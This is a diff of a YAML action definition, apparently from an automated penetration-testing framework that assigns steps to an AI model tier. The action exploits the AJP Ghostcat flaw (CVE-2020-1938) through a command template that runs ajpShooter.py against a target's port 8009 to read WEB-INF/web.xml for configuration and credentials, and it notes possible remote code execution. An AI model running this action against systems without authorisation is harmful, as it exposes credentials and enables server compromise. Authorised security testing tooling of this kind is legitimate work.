@@ -2,15 +2,18 @@ name: ajp_ghostcat
 category: services
 description: AJP Ghostcat exploitation (CVE-2020-1938)
 preconditions:
-  - service.port==8009
+- service.port==8009
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "python3 ajpShooter.py http://{target_ip}:8080 {target_ip} 8009 /WEB-INF/web.xml read"
+command_template: python3 ajpShooter.py http://{target_ip}:8080 {target_ip} 8009 /WEB-INF/web.xml
+  read
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "AJP connector on port 8009 allows file read from webroot and potential RCE. Read WEB-INF/web.xml for config/credentials. RCE if file upload exists."
+mechanism: AJP connector on port 8009 allows file read from webroot and potential
+  RCE. Read WEB-INF/web.xml for config/credentials. RCE if file upload exists.
+hacktricks_ref: network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp.md
